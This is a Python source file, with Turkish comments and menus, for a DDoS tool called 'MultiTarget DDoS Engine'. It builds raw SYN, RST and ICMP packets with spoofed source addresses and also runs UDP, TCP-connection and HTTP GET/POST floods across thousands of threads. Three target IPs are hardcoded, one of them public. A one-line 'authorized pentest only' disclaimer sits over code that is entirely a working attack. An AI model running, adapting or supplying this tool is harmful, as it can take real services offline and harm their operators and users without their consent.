#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MultiTarget DDoS Tool - Layer 4 & Layer 7 (GERÇEK PAKET GÖNDERİMİ)
# Sadece yetkili pentestler için kullanın

import socket
import threading
import random
import time
import sys
import os
import struct
import urllib.request
import urllib.error
from datetime import datetime

# HEDEF IP'LER (sabit, script'e gömülü)
TARGET_IPS = ["78.181.164.55", "192.168.1.140", "192.168.1.138"]
THREAD_COUNT = 1000
TIMEOUT = 3

# İstatistik değişkenleri
total_packets_sent = 0
total_bytes_sent = 0
stats_lock = threading.Lock()
running = True
start_time = 0

def update_stats(packet_count=1, byte_count=0):
    """İstatistikleri güncelle"""
    global total_packets_sent, total_bytes_sent
    with stats_lock:
        total_packets_sent += packet_count
        total_bytes_sent += byte_count

def get_speed():
    """Mbps hızını hesapla"""
    global total_bytes_sent, total_packets_sent
    elapsed = time.time() - start_time
    if elapsed <= 0:
        return 0, 0
    bits = total_bytes_sent * 8
    mbps = (bits / elapsed) / 1_000_000
    pps = total_packets_sent / elapsed  # packets per second
    return mbps, pps

def stats_printer():
    """İstatistik yazıcı thread"""
    global running, total_packets_sent, total_bytes_sent
    while running:
        time.sleep(1)
        mbps, pps = get_speed()
        with stats_lock:
            pkts = total_packets_sent
            bytes_s = total_bytes_sent
        
        elapsed = int(time.time() - start_time)
        mb_sent = bytes_s / 1_000_000
        
        print(f"\r\033[1;37m[⏱ {elapsed}s] \033[1;32m📦 Gönderilen: {pkts:,} paket \033[1;36m📊 Hız: {mbps:.2f} Mbps \033[1;33m⚡ {pps:,.0f} pps \033[1;35m💾 {mb_sent:.1f} MB\033[0m    ", end="", flush=True)

# Banner
def banner():
    os.system('clear')
    print("""\033[1;31m
    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██████╗ 
    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗╚════██╗
    █████╗   ╚████╔╝ ██║  ██║█████╗  ██████╔╝ █████╔╝
    ██╔══╝    ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗ ╚═══██╗
    ██║        ██║   ███████╔╝███████╗██║  ██║██████╔╝
    ╚═╝        ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ 
    \033[1;37m[ MultiTarget DDoS Engine v4.0 - REAL PACKET ]
    [ Layer 4 + Layer 7 | 3 Target IPs SABIT ]
    [\033[1;32m YETKILI PENTEST ICIN \033[1;37m]
    [ Gercek paket gonderimi + Mbps gostergesi ]
    \033[0m""")

# ==================== LAYER 4 - GERÇEK PAKETLER ====================

def syn_flood(target_ip, target_port):
    """TCP SYN Flood - GERÇEK paket"""
    try:
        # RAW socket oluştur (root gerekli)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        
        src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        ack_num = 0
        
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(target_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto,
            ip_check, ip_saddr, ip_daddr)
        
        # TCP Header (SYN flag = 0x02)
        tcp_offset = 5
        tcp_flags = 0x02  # SYN
        tcp_window = socket.htons(65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, ack_num,
            tcp_offset << 4, tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum
        psh = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
            0, socket.IPPROTO_TCP, len(tcp_header))
        
        psh = psh + tcp_header
        tcp_check = checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, ack_num,
            tcp_offset << 4, tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        packet = ip_header + tcp_header
        s.sendto(packet, (target_ip, 0))
        s.close()
        
        update_stats(1, len(packet))
        return True
    except Exception as e:
        return False

def checksum(data):
    """IP/TCP/UDP checksum hesaplama"""
    if len(data) % 2 != 0:
        data += b'\x00'
    
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        total += word
    
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF

def udp_flood(target_ip, target_port):
    """UDP Flood - GERÇEK paket"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload_size = random.randint(1400, 65507)
        payload = random._urandom(payload_size)
        s.sendto(payload, (target_ip, target_port))
        s.close()
        update_stats(1, 28 + payload_size)  # 28 byte UDP header
        return True
    except:
        return False

def icmp_flood(target_ip):
    """ICMP Flood - GERÇEK paket"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(0, 65535)
        icmp_seq = random.randint(0, 65535)
        
        data_size = random.randint(64, 4096)
        data = random._urandom(data_size)
        
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        packet = header + data
        icmp_checksum = checksum(packet)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        packet = header + data
        
        s.sendto(packet, (target_ip, 1))
        s.close()
        update_stats(1, len(packet))
        return True
    except:
        return False

def tcp_connection_flood(target_ip, target_port):
    """TCP Connection Flood - Gerçek bağlantı"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, target_port))
        # Küçük veri gönder
        try:
            s.send(random._urandom(512))
        except:
            pass
        time.sleep(0.05)
        s.close()
        update_stats(1, 1000)
        return True
    except:
        return False

def tcp_rst_flood(target_ip, target_port):
    """TCP RST Flood - GERÇEK paket"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        
        src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 0xFFFFFFFF)
        ack_num = 0
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (4 << 4) + 5, 0, 40, random.randint(1,65535), 0, 64, socket.IPPROTO_TCP,
            0, socket.inet_aton(src_ip), socket.inet_aton(target_ip))
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, ack_num,
            5 << 4, 0x04, socket.htons(65535), 0, 0)  # RST flag = 0x04
        
        psh = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip), socket.inet_aton(target_ip),
            0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
        tcp_check = checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, seq_num, ack_num,
            5 << 4, 0x04, socket.htons(65535), tcp_check, 0)
        
        packet = ip_header + tcp_header
        s.sendto(packet, (target_ip, 0))
        s.close()
        update_stats(1, len(packet))
        return True
    except:
        return False

# ==================== LAYER 7 ====================

def http_get_flood(target_url):
    """HTTP GET Flood"""
    try:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
        ]
        
        req = urllib.request.Request(target_url)
        req.add_header('User-Agent', random.choice(user_agents))
        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        req.add_header('Accept-Language', 'en-US,en;q=0.5')
        req.add_header('Connection', 'keep-alive')
        req.add_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        req.add_header('Pragma', 'no-cache')
        req.add_header('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        req.add_header('Referer', f"http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}/")
        
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        data = response.read()
        response.close()
        update_stats(1, len(data) + 500)  # yaklaşık paket boyutu
        return True
    except:
        return False

def http_post_flood(target_url):
    """HTTP POST Flood - büyük veri"""
    try:
        data = random._urandom(random.randint(8192, 131072))
        req = urllib.request.Request(target_url, data=data)
        req.add_header('User-Agent', f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
        req.add_header('Content-Type', 'multipart/form-data; boundary=----WebKitFormBoundary' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)))
        req.add_header('Content-Length', str(len(data)))
        req.add_header('Expect', '')
        
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        response.read()
        response.close()
        update_stats(1, len(data) + 500)
        return True
    except:
        return False

def http_https_flood(target_url):
    """HTTP ve HTTPS Flood - karışık"""
    try:
        # Random URL path
        paths = ["/", "/index.php", "/login", "/api", "/wp-admin", "/admin", "/search", "/about", "/contact", "/products"]
        random_path = random.choice(paths) + "?" + "&".join([f"param{i}={random.randint(0,9999)}" for i in range(5)])
        
        # URL'i parçala
        if target_url.startswith("http://"):
            base = target_url.replace("http://", "").split("/")[0]
            full_url = f"http://{base}{random_path}"
        elif target_url.startswith("https://"):
            base = target_url.replace("https://", "").split("/")[0]
            full_url = f"https://{base}{random_path}"
        else:
            full_url = target_url
        
        req = urllib.request.Request(full_url)
        req.add_header('User-Agent', f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/{random.randint(80,120)}.0.0.0")
        req.add_header('Accept', '*/*')
        req.add_header('Accept-Encoding', 'gzip, deflate, br')
        req.add_header('Connection', 'keep-alive')
        
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        response.read()
        response.close()
        update_stats(1, 2000)
        return True
    except:
        return False

# ==================== ÇOKLU THREAD ÇALIŞTIRICI ====================

def layer4_worker_syn(target_ip, target_port):
    while running:
        syn_flood(target_ip, target_port)

def layer4_worker_udp(target_ip, target_port):
    while running:
        udp_flood(target_ip, target_port)

def layer4_worker_icmp(target_ip):
    while running:
        icmp_flood(target_ip)

def layer4_worker_tcp(target_ip, target_port):
    while running:
        tcp_connection_flood(target_ip, target_port)

def layer4_worker_rst(target_ip, target_port):
    while running:
        tcp_rst_flood(target_ip, target_port)

def layer7_worker_get(target_url):
    while running:
        http_get_flood(target_url)

def layer7_worker_post(target_url):
    while running:
        http_post_flood(target_url)

def layer7_worker_https(target_url):
    while running:
        http_https_flood(target_url)

def start_attack(target_mode, target_value, attack_type, layer, port=80):
    """Ana saldırı başlatıcı - TÜM 3 IP'YE"""
    global running, start_time
    running = True
    start_time = time.time()
    
    print(f"\n\033[1;33m[+] ⚔️ SALDIRI BAŞLATILIYOR ⚔️\033[0m")
    print(f"\033[1;36m[+] Hedef IP'ler: {', '.join(TARGET_IPS)}\033[0m")
    print(f"\033[1;36m[+] Saldırı Tipi: {attack_type.upper()}\033[0m")
    print(f"\033[1;36m[+] Katman: {layer}\033[0m")
    print(f"\033[1;36m[+] Thread Sayısı: {THREAD_COUNT}\033[0m")
    print(f"\033[1;31m[!] Durdurmak için Ctrl+C basın\033[0m\n")
    
    threads = []
    
    # İstatistik thread'i
    stats_thread = threading.Thread(target=stats_printer)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Her 3 IP için saldırı thread'lerini başlat
    for target_ip in TARGET_IPS:
        if layer == "4":
            if attack_type in ["syn", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 6):
                    t = threading.Thread(target=layer4_worker_syn, args=(target_ip, port))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            if attack_type in ["udp", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 6):
                    t = threading.Thread(target=layer4_worker_udp, args=(target_ip, port))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            if attack_type in ["icmp", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 6):
                    t = threading.Thread(target=layer4_worker_icmp, args=(target_ip,))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            if attack_type in ["tcp", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 6):
                    t = threading.Thread(target=layer4_worker_tcp, args=(target_ip, port))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            if attack_type in ["rst", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 6):
                    t = threading.Thread(target=layer4_worker_rst, args=(target_ip, port))
                    t.daemon = True
                    threads.append(t)
                    t.start()
        
        elif layer == "7":
            if target_mode == "url":
                base_url = target_value
            else:
                base_url = f"http://{target_ip}:{port}"
            
            if attack_type in ["get", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 4):
                    t = threading.Thread(target=layer7_worker_get, args=(base_url,))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            if attack_type in ["post", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 4):
                    t = threading.Thread(target=layer7_worker_post, args=(base_url,))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            if attack_type in ["https", "tümü", "all"]:
                for _ in range(THREAD_COUNT // 4):
                    t = threading.Thread(target=layer7_worker_https, args=(base_url,))
                    t.daemon = True
                    threads.append(t)
                    t.start()
        
        elif layer == "all":
            # Layer 4
            if target_mode == "url":
                base_url = target_value
            else:
                base_url = f"http://{target_ip}:{port}"
            
            for method in ["syn", "udp", "icmp", "tcp", "rst"]:
                if method == "syn":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer4_worker_syn, args=(target_ip, port))
                        t.daemon = True; threads.append(t); t.start()
                elif method == "udp":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer4_worker_udp, args=(target_ip, port))
                        t.daemon = True; threads.append(t); t.start()
                elif method == "icmp":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer4_worker_icmp, args=(target_ip,))
                        t.daemon = True; threads.append(t); t.start()
                elif method == "tcp":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer4_worker_tcp, args=(target_ip, port))
                        t.daemon = True; threads.append(t); t.start()
                elif method == "rst":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer4_worker_rst, args=(target_ip, port))
                        t.daemon = True; threads.append(t); t.start()
            
            # Layer 7
            for method in ["get", "post", "https"]:
                if method == "get":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer7_worker_get, args=(base_url,))
                        t.daemon = True; threads.append(t); t.start()
                elif method == "post":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer7_worker_post, args=(base_url,))
                        t.daemon = True; threads.append(t); t.start()
                elif method == "https":
                    for _ in range(THREAD_COUNT // 20):
                        t = threading.Thread(target=layer7_worker_https, args=(base_url,))
                        t.daemon = True; threads.append(t); t.start()
    
    print(f"\033[1;32m[+] {len(threads)} thread başlatıldı (3 IP x {len(threads)//3} thread/IP)\033[0m")
    print(f"\033[1;32m[+] 3 hedef IP'ye eş zamanlı saldırı BAŞLADI!\033[0m")
    print(f"\033[1;32m[+] Gerçek paketler gonderiliyor - Mbps yukarıda canlı gösteriliyor\033[0m")
    
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        elapsed = int(time.time() - start_time)
        mbps, pps = get_speed()
        print(f"\n\n\033[1;31m[!] SALDIRI DURDURULDU!\033[0m")
        print(f"\033[1;33m[📊] Toplam: {total_packets_sent:,} paket, {total_bytes_sent/1_000_000:.1f} MB")
        print(f"\033[1;33m[📊] Süre: {elapsed}s | Ortalama Hız: {mbps:.2f} Mbps | {pps:,.0f} pps\033[0m")

# ==================== ANA MENU ====================

def main():
    global THREAD_COUNT
    
    banner()
    
    # Root kontrolü
    try:
        is_root = os.geteuid() == 0
    except:
        is_root = False
    
    if not is_root:
        print("\033[1;33m[!] Root yetkisi YOK! SYN/ICMP/RST Flood çalışmaz.\033[0m")
        print("\033[1;33m[!] Termux: pkg install tsu && tsu\033[0m")
        print("\033[1;33m[!] Sadece UDP, TCP connection, Layer 7 çalışır\033[0m\n")
    else:
        print("\033[1;32m[✓] Root yetkisi var - Tüm Layer 4 metodları çalışır\033[0m\n")
    
    print("\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║           SALDIRI TİPİ SEÇİN                   ║\033[0m")
    print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m Layer 4 - SYN Flood (TCP yarım bağlantı)  ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m Layer 4 - UDP Flood (maksimum boyut)       ║\033[0m")
    print("\033[1;36m║  \033[1;33m[3]\033[1;36m Layer 4 - ICMP/Ping Flood                  ║\033[0m")
    print("\033[1;36m║  \033[1;33m[4]\033[1;36m Layer 4 - TCP Connection Flood             ║\033[0m")
    print("\033[1;36m║  \033[1;33m[5]\033[1;36m Layer 4 - TCP RST Flood                    ║\033[0m")
    print("\033[1;36m║  \033[1;33m[6]\033[1;36m Layer 4 - TÜMÜ (SYN+UDP+ICMP+TCP+RST)      ║\033[0m")
    print("\033[1;36m║  \033[1;33m[7]\033[1;36m Layer 7 - HTTP GET Flood                   ║\033[0m")
    print("\033[1;36m║  \033[1;33m[8]\033[1;36m Layer 7 - HTTP POST Flood (büyük veri)     ║\033[0m")
    print("\033[1;36m║  \033[1;33m[9]\033[1;36m Layer 7 - HTTPS karışık flood              ║\033[0m")
    print("\033[1;36m║  \033[1;33m[10]\033[1;36m Layer 7 - TÜMÜ (GET+POST+HTTPS)           ║\033[0m")
    print("\033[1;36m║  \033[1;31m[11]\033[1;36m LAYER 4 + LAYER 7 KOMBO (MAX GÜÇ!)        ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
    
    choice = input("\n\033[1;33m[?] Seçiminiz (1-11): \033[0m").strip()
    
    if choice not in [str(i) for i in range(1, 12)]:
        print("\033[1;31m[!] Geçersiz seçim! Lütfen 1-11 arası bir sayı girin.\033[0m")
        return
    
    # Haritalama
    layer_map = {
        "1": ("4", "syn"), "2": ("4", "udp"), "3": ("4", "icmp"),
        "4": ("4", "tcp"), "5": ("4", "rst"), "6": ("4", "tümü"),
        "7": ("7", "get"), "8": ("7", "post"), "9": ("7", "https"),
        "10": ("7", "tümü"), "11": ("all", "tümü")
    }
    
    layer, attack_type = layer_map[choice]
    
    print(f"\n\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║              HEDEF TİPİ SEÇİN                   ║\033[0m")
    print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m Site URL (örn: http://site.com veya https)║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP + Port (örn: port 80, 443, 22)          ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
    
    target_choice = input("\n\033[1;33m[?] Seçiminiz (1-2): \033[0m").strip()
    
    target_mode = None
    target_value = None
    port = 80
    
    if target_choice == "1":
        target_mode = "url"
        target_value = input("\033[1;33m[?] Hedef URL (örn: http://site.com): \033[0m").strip()
    elif target_choice == "2":
        target_mode = "ip"
        port_str = input("\033[1;33m[?] Port (örn: 80, 443, 22): \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 80
    else:
        print("\033[1;31m[!] Geçersiz seçim! 1 veya 2 girin.\033[0m")
        return
    
    # Thread sayısı
    tc = input(f"\033[1;33m[?] Thread sayısı (varsayılan: {THREAD_COUNT}, max önerilen: 5000): \033[0m").strip()
    if tc:
        try:
            THREAD_COUNT = max(100, min(10000, int(tc)))
        except:
            pass
    
    print(f"\n\033[1;32m{'='*55}\033[0m")
    print(f"\033[1;32m  🔥 HEDEFLER: 78.181.164.55 | 192.168.1.140 | 192.168.1.138 🔥\033[0m")
    print(f"\033[1;32m  🔥 3 IP'ye EŞ ZAMANLI saldırı başlıyor...\033[0m")
    print(f"\033[1;32m{'='*55}\033[0m")
    
    start_attack(target_mode, target_value, attack_type, layer, port)

if __name__ == "__main__":
    main()
